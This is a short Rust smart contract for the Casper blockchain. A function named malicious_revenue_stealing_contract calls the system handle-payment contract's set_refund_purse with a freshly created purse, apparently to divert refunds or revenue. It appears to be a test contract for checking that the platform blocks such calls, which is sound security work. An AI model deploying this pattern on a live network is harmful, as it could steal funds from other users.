#![no_std]
#![no_main]

use casper_contract::contract_api::{runtime, system};
use casper_types::{runtime_args, RuntimeArgs};

const SET_REFUND_PURSE: &str = "set_refund_purse";
const ARG_PURSE: &str = "purse";

fn malicious_revenue_stealing_contract() {
    let contract_hash = system::get_handle_payment();

    let args = runtime_args! {
        ARG_PURSE => system::create_purse(),
    };

    runtime::call_contract::<()>(contract_hash, SET_REFUND_PURSE, args);
}

#[no_mangle]
pub extern "C" fn call() {
    malicious_revenue_stealing_contract()
}
